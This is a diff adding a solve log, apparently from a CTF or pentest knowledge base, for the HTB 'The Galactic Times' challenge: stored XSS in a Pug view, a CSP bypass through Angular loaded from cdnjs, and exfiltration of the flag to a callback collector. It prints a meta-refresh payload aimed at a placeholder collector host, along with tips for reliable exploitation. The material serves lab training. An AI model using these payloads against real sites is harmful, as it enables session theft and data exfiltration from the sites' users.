@@ -160,3 +160,34 @@ Falsifier: 400 'Invalid provider' (host check not bypassed) or 400 'Invalid expo
 **Blast radius**: shared instance: the payload is a row in a shared presentations table with NO delete endpoint, so it cannot be cleaned up afterwards, and while it is live it redirects the shared admin bot and overwrites its auth cookie. Submit exactly one, expect the bot/app to reset the table periodically (so it may need re-submitting), and never point the meta refresh anywhere but the challenge host.
 
 - status: proposed
+
+## 2026-09-27 · The Galactic Times · confirmed
+
+- source note: `challenges/The Galactic Times/web_the_galactic_times/challenge/views/list.pug`
+- chain card: `knowledge/chains/htb-galactic-times-pug-unescaped-stored-xss-cdnjs-angular-csp-bypass-localhost-bot-read.json`
+- verification: verified_live — Live HTB instance. A meta-refresh payload produced a request from Mozilla/5.0 (X11; Linux x86_64) ... HeadlessChrome/90.0.4427.0 Safari/537.36, proving the bot, the raw-HTML rendering and the container's egress. A cdnjs angular payload with an 8-second meta-refresh fallback produced the angular marker and never the fallback, proving the CSP bypass. The final payload returned GOT?f=HTB{...} to the collector. Separately, before any of that, the bypass was verified in a browser against the live origin's real CSP header: new Function(...) returned FUNC-OK, the cdnjs script loaded and defined angular, angular.bootstrap on {{constructor.constructor(...)()}} executed, fetch('/alien') reached the app and was refused by it with 401 rather than by CSP, while a cross-origin fetch and a cross-origin image were both blocked.
+- classified as: `web-xss` (score 0.0, 0 signals matched)
+- also matched: `web-ssrf` (1.4), `web-cache-poisoning` (1.06)
+- filed by operator override: the matcher did not rank this class; the chain is filed under the class whose first probe opens it
+
+**Confirming probe that worked**
+
+> submit, as the stored content, exactly: <meta http-equiv="refresh" content="0;url=http://<your collector>/marker">
+
+Expected: a request for /marker arrives at your collector from a headless browser user agent, within seconds of the submission
+
+Falsifier: nothing arrives. Before blaming the payload, re-prove that the collector is reachable from outside at that exact moment -- a dead tunnel and a broken payload look identical from here
+
+**Traps recorded on this solve**
+
+- a dead callback host is indistinguishable from a broken payload, and this is the trap that cost the most here. The free ssh tunnel used carried traffic for roughly a minute after it was established and then silently stopped while the ssh process stayed alive and the public hostname merely timed out. Four payload variants and a length sweep were all wrongly suspected before re-sending a known-good payload showed that IT had stopped arriving too. Prove delivery with a marker request immediately before every submission, and rebuild the tunnel per attempt rather than leaving one up.
+- fetch().then(...) in the payload produces no hit AND no error, because the bot's goto resolves on network idle and browser.close() tears the page down before the promise settles. That silence reads exactly like a payload that never ran. Use a synchronous XMLHttpRequest.
+- a failed angular expression is silent. Keep the expression string single-quoted with double quotes inside -- the one form proven to work here -- because a backslash-escaped variant parses as nothing and reports nothing. Avoid regexes in the expression too: braces inside {{ }} are an avoidable risk, and indexOf plus substr needs neither braces nor escapes.
+- always include a catch that navigates with the error text. Without it every failure mode looks the same from outside.
+- `kill "${VAR:-0}"` in a runner script sends the signal to the whole PROCESS GROUP on the first pass, when the variable is still unset, and kills the script itself -- exit 144 after printing one line. This masqueraded as the exploit failing for two runs. Only ever kill a PID that is set and greater than 1.
+- the app's own cleanup wipes the stored content after every bot visit, so a payload cannot be staged and triggered later; and a browser that follows redirects will turn the gated page's 401 into something else entirely if you probe it carelessly.
+- discovery that was interrupted is not a negative result. The route holding the flag was in the wordlist already in use; the run was cut short by a timeout wrapper after printing two routes, and the partial output was read as the complete list.
+
+**Blast radius**: Every attempt writes a row and launches a browser on the target: the submission endpoint calls the bot synchronously in its handler, so one submission is one Chrome launch. Keep the rate to a few per minute and the attempt count low. The app wipes its own table after each bot visit, so nothing persists and there is nothing to clean up on the target, but that same wipe means a payload left sitting is gone by the next visit -- submit and watch in one go rather than staging. On your own side this needs a public collector: bind it to loopback, expose it only through one tunnel, use it for the single leak, then tear it down and verify the port is refusing connections.
+
+- status: confirmed
